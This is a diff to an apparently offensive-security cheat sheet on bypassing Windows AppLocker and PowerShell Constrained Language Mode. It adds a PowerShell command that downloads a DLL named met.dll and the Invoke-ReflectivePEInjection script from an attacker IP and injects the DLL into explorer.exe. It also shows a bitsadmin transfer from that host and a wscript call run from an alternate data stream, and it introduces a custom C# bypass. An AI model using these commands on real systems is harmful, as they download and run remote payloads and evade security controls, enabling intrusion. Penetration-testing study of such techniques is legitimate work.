@@ -2251,7 +2251,10 @@ wscript "C:\path\to\my\file.log:test.js"
 ```
 
 ## Bypassing AppLocker
-### Custom Runspaces - Bypass CLM
+### PowerShell 
+
+** Custom Runspaces (Bypass CLM): **
+
 PowerShell.exe is essentially a GUI application handling input and output. The real functionality lies inside the System.Management.Automation.dll managed DLL, which PowerShell.exe calls to create a runspace.
 
 It is possible to leverage multithreading and parallel task execution through either Jobs or Runspaces. The APIs for creating a runspace are public and available to managed code written in C#.
@@ -2288,8 +2291,6 @@ namespace Bypass
     }
 }
 ```
-
-### Powershell Constrained Language Mode (CLM) Bypass
 
 The PowerShell execution policy restricts the execution of scripts, but this is a weak protection mechanism 
 which can be easily bypassed with the built-in "Bypass" execution policy. 
@@ -2404,8 +2405,20 @@ bitsadmin /Transfer myJob http://192.168.119.120/file.txt C:\users\student\enc.t
 
 ```
 
+As a last step we can use Invoke-ReflectivePEInjection.ps1 to reflectively load a DLL into a remote process
+
+Updated cmd variable:
+```powershell
+String cmd = "$bytes = (New-Object System.Net.WebClient).DownloadData('http://192.168.119.120/met.dll');(New-Object System.Net.WebClient).DownloadString('http://192.168.119.120/Invoke-ReflectivePEInjection.ps1') | IEX; $procid = (Get-Process -Name explorer).Id; Invoke-ReflectivePEInjection -PEBytes $bytes -ProcId $procid";
+```
+
 </details>
 
+### C#
+
+We have successfully bypassed AppLocker's PowerShell restrictions and have executed arbitrary managed C# and PowerShell code through InstallUtil. However, this relies on the existence of a single binary. If InstallUtil was blocked by a deny rule, this technique would fail. Let's improve our tradecraft by building another AppLocker bypass in C#.
+
+In addition to providing an alternative bypass method for C# code execution, this process demonstrates basic techniques which could aid future research. Discovering a bypass is not completely trivial, so we'll divide this process into a number of steps.
 
 
 
